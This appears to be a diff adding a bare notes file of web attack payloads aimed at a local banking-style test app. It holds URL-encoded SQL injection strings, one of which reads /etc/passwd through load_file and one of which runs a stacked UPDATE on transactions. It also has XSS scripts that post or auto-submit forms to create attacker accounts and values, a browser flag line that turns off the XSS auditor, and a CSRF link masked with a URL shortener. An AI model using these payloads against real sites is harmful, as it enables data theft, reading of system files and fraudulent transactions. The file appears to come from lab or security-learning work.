@@ -1,0 +1,12 @@
+d=-1%20UNION%20SELECT%20%20*%20%20FROM%20transact
+d=-1%20UNION%20SELECT%20%20id,%20%20load_file("/etc/passwd"),%20%20account_number,%20%20value,%20status%20FROM%20transact
+?id2=-1%20UNION%20SELECT%20%20*%20%20FROM%20transact;%20UPDATE%20transact%20SET%20%20status=0;
+
+/chromium-browser --disable-xss-auditor --enable-devtools-experiments --disable-features=enable-automatic-password-saving
+xss:
+<script>var xhttp = new XMLHttpRequest(); xhttp.open("POST", "insert_admin.php",   true);  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");  xhttp.send("user=hacker&account_number=hackaccount123&value=699"); </script>
+<script>window.onload%20=%20function()%20%20{%20document.getElementById(%27account_user3%27).value%20%20="beata";%20%20document.getElementById(%27account_number2%27).value%20="hack_value123";%20%20document.getElementById(%27my_value%27).value%20="344"; document.getElementById(%27changebutton%27).click();};</script>
+
+csfr/xsfr:
+http://localhost/insert_admin.php?user2=haker&account=hackaccount123&value2=89 --> tiny url : https://tinyurl.com/yaea2h57
+
